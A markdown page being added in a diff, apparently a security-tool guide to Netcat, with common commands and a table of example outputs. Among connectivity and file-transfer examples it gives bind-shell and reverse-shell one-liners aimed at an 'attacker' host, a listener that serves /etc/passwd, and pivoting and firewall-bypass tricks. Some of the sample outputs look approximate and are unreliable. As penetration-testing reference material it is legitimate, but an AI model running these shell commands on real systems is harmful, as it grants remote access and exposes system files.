@@ -1,0 +1,290 @@
+---
+title: "Netcat"
+description: "Netcat tool guide; includes tool's purpose,primary uses,core features,data sources, common commands and example of command's usages."
+tags: ['network']
+---
+
+**Netcat (nc)** is an **open-source** networking utility that reads and writes data across network connections using TCP or UDP protocols. Often referred to as the "TCP/IP Swiss Army knife," Netcat is one of the most versatile and essential tools in a security professional's toolkit. It can function as a simple TCP/UDP listener, port scanner, file transfer tool, backdoor, or port forwarding utility.
+
+**Here are the primary uses of Netcat:**
+
+  * **Port Scanning:** Netcat can be used to scan target systems for open ports and available services. While not as feature-rich as dedicated port scanners, it provides a simple and effective method for basic port enumeration.
+
+  * **Banner Grabbing:** The tool connects to services on target ports and retrieves banner information, helping identify service versions and potential vulnerabilities. This is crucial during the reconnaissance phase of penetration testing.
+
+  * **Remote Shell Access:** Netcat can establish reverse shells or bind shells, providing command-line access to remote systems. This functionality makes it valuable for both legitimate remote administration and penetration testing scenarios.
+
+  * **File Transfer:** Netcat facilitates quick file transfers between systems without requiring FTP, SSH, or other file transfer protocols. This is particularly useful in environments with limited tools available.
+
+  * **Network Debugging:** System administrators and security professionals use Netcat to troubleshoot network connectivity issues, test firewall rules, and verify service availability. Its simplicity makes it ideal for quick network diagnostics.
+
+  * **Port Forwarding and Proxying:** Netcat can redirect traffic from one port to another or act as a simple proxy, enabling security testers to pivot through networks or bypass certain network restrictions.
+
+  * **Chat and Communication:** The tool can create simple client-server chat sessions for testing network communication or establishing basic encrypted communication channels when combined with other tools.
+
+
+
+
+## Core Features​
+
+  * TCP and UDP Support
+  * Port Scanning
+  * Banner Grabbing
+  * Bind Shell Creation
+  * Reverse Shell Establishment
+  * File Transfer
+  * Port Forwarding
+  * Network Listening
+  * Data Piping
+  * Zero I/O Mode
+  * Timing Controls
+  * Verbose Output
+
+
+
+## Data sources​
+
+  * Network Connections
+  * Service Banners
+  * Port Status Information
+  * Network Traffic
+  * File Data
+  * Command Output
+  * Standard Input/Output
+  * Socket Information
+
+
+
+## Common Netcat Commands​
+
+### 1\. Basic Connection to a Port​
+
+  * This command establishes a basic TCP connection to a specified host and port. It's used for testing connectivity and interacting with network services.
+
+
+    
+    
+```
+nc <target_host> <port>  
+```
+### 2\. Listen on a Port​
+
+  * This command sets Netcat to listen mode on a specified port, waiting for incoming connections. It's essential for creating servers or receiving reverse shells.
+
+
+    
+    
+```
+nc -l -p <port>  
+```
+### 3\. Port Scanning​
+
+  * This command scans a range of ports on a target system to identify open ports. The -z flag enables zero I/O mode for scanning without sending data.
+
+
+    
+    
+```
+nc -zv <target_host> <start_port>-<end_port>  
+```
+### 4\. Banner Grabbing​
+
+  * This command connects to a service and retrieves its banner information, revealing service type and version details useful for vulnerability assessment.
+
+
+    
+    
+```
+echo "" | nc -v -n -w1 <target_host> <port>  
+```
+### 5\. Transfer File (Sender)​
+
+  * This command sends a file from the local system to a remote system listening with Netcat. It provides a quick method for file transfer without additional protocols.
+
+
+    
+    
+```
+nc <target_host> <port> < file.txt  
+```
+### 6\. Receive File (Receiver)​
+
+  * This command listens for incoming file transfers and saves the received data to a specified file. It must be running before the sender initiates transfer.
+
+
+    
+    
+```
+nc -l -p <port> > received_file.txt  
+```
+### 7\. Create Bind Shell (Listener)​
+
+  * This command creates a bind shell on the target system, executing a shell that listens on a specified port for incoming connections.
+
+
+    
+    
+```
+nc -l -p <port> -e /bin/bash  
+```
+### 8\. Connect to Bind Shell (Client)​
+
+  * This command connects to a bind shell on a remote system, providing command-line access to the target machine.
+
+
+    
+    
+```
+nc <target_host> <port>  
+```
+### 9\. Create Reverse Shell (Target)​
+
+  * This command establishes a reverse shell from the target system back to the attacker's machine, bypassing firewall restrictions on incoming connections.
+
+
+    
+    
+```
+nc <attacker_host> <port> -e /bin/bash  
+```
+### 10\. Receive Reverse Shell (Attacker)​
+
+  * This command sets up a listener to receive reverse shell connections from target systems, providing remote command execution capabilities.
+
+
+    
+    
+```
+nc -l -p <port> -v  
+```
+### 11\. UDP Connection​
+
+  * This command establishes a UDP connection instead of TCP, useful for testing UDP services or protocols that don't require reliable delivery.
+
+
+    
+    
+```
+nc -u <target_host> <port>  
+```
+### 12\. Port Forwarding​
+
+  * This command forwards traffic from one port to another, creating a simple proxy or relay. It's useful for pivoting through networks during penetration tests.
+
+
+    
+    
+```
+nc -l -p <local_port> -c "nc <target_host> <target_port>"  
+```
+### 13\. Verbose Mode​
+
+  * This command enables verbose output, providing detailed information about connections, errors, and operations. It's essential for debugging and monitoring.
+
+
+    
+    
+```
+nc -v <target_host> <port>  
+```
+### 14\. Set Connection Timeout​
+
+  * This command sets a timeout for connection attempts, automatically closing connections that don't respond within the specified time period.
+
+
+    
+    
+```
+nc -w <seconds> <target_host> <port>  
+```
+### 15\. Keep Connection Open​
+
+  * This command keeps the connection open even after EOF on stdin, useful for maintaining persistent connections or shells.
+
+
+    
+    
+```
+nc -k -l -p <port>  
+```
+### 16\. Use Source Port​
+
+  * This command specifies a particular source port for outgoing connections, useful for bypassing certain firewall rules that allow specific source ports.
+
+
+    
+    
+```
+nc -p <source_port> <target_host> <target_port>  
+```
+### 17\. Create Chat Server​
+
+  * This command creates a simple chat server where multiple clients can connect and communicate, useful for testing multi-client scenarios.
+
+
+    
+    
+```
+nc -l -p <port>  
+```
+### 18\. Telnet Replacement​
+
+  * This command uses Netcat as a telnet replacement to connect to telnet services, providing more control and flexibility than traditional telnet clients.
+
+
+    
+    
+```
+nc <target_host> 23  
+```
+### 19\. Help and Usage Information​
+
+  * This command displays the help menu and usage information for Netcat, listing all available options and parameters.
+
+
+    
+    
+```
+nc -h  
+```
+Alternative usage:
+    
+    
+```
+nc --help  
+```
+## Output Examples of Netcat Commands​
+
+Command| Example Usage| Function| Output Example  
+---|---|---|---  
+Basic Connection| `nc example.com 80`| Connects to web server on port 80.| `Connection to example.com 80 port [tcp/http] succeeded!`  
+Listen on Port| `nc -l -p 4444`| Listens for incoming connections on port 4444.| `Listening on 0.0.0.0 4444`  
+Port Scanning| `nc -zv 192.168.1.1 20-25`| Scans ports 20-25 on target.| `Connection to 192.168.1.1 22 port [tcp/ssh] succeeded! `   
+` Connection to 192.168.1.1 23 port [tcp/telnet] failed`  
+Banner Grabbing| `echo ""| nc -v 192.168.1.1 80`| Retrieves HTTP server banner.  
+Transfer File| `nc 192.168.1.10 4444 < file.txt`| Sends file to listening host.| _(File transfer in progress)_  
+Receive File| `nc -l -p 4444 > received.txt`| Receives and saves incoming file.| _(Receiving file data)_  
+Bind Shell| `nc -l -p 4444 -e /bin/bash`| Creates bind shell on port 4444.| `Listening on 0.0.0.0 4444`  
+Connect to Bind Shell| `nc 192.168.1.10 4444`| Connects to remote bind shell.| `whoami `   
+` root`  
+Reverse Shell| `nc 192.168.1.100 4444 -e /bin/bash`| Sends reverse shell to attacker.| _(Shell connection established)_  
+Receive Reverse Shell| `nc -l -p 4444 -v`| Listens for reverse shell connection.| `Connection from 192.168.1.10:45678`  
+UDP Connection| `nc -u 192.168.1.1 53`| Connects to DNS service via UDP.| `Connected to 192.168.1.1`  
+Verbose Output| `nc -v example.com 80`| Shows detailed connection information.| `Connection to example.com 80 port [tcp/http] succeeded!`  
+Set Timeout| `nc -w 5 192.168.1.1 80`| Sets 5-second connection timeout.| `Connection timeout after 5 seconds`  
+Keep Alive| `nc -k -l -p 4444`| Keeps listening after client disconnect.| `Listening on 0.0.0.0 4444 (persistent)`  
+Source Port| `nc -p 53 192.168.1.1 80`| Uses port 53 as source port.| `Connection from source port 53`  
+Numeric IP Only| `nc -n 192.168.1.1 80`| Disables DNS resolution.| `Connection to 192.168.1.1 80 port succeeded!`  
+IPv6 Connection| `nc -6 example.com 80`| Forces IPv6 connection.| `Connection to example.com (IPv6) succeeded!`  
+No DNS| `nc -n 192.168.1.1 22`| Connects without DNS lookup.| `Connection to 192.168.1.1 22 port succeeded!`  
+Idle Timeout| `nc -i 10 192.168.1.1 80`| Sets 10-second idle timeout.| `Idle timeout set to 10 seconds`  
+Send CRLF| `nc -C example.com 80`| Sends CRLF for line endings.| _(CRLF line ending mode enabled)_  
+Telnet Mode| `nc -t example.com 23`| Responds to telnet negotiations.| `Trying 192.168.1.1... `   
+` Connected to example.com`  
+Execute Command| `nc -l -p 4444 -c "cat /etc/passwd"`| Executes command on connection.| `root:x:0:0:root:/root:/bin/bash`  
+Proxy Connection| `nc -l -p 8080 -c "nc example.com 80"`| Creates simple HTTP proxy.| `Proxying connection to example.com:80`  
+Hex Dump| `nc -l -p 4444| hexdump -C`| Shows received data in hex format.  
+Multiple Clients| `nc -k -l -p 4444`| Allows multiple client connections.| `Client 1 connected `   
+` Client 2 connected`  
+Chat Session| `nc -l -p 4444`| Creates simple chat server.| `Hello from client! `   
+` Message received`
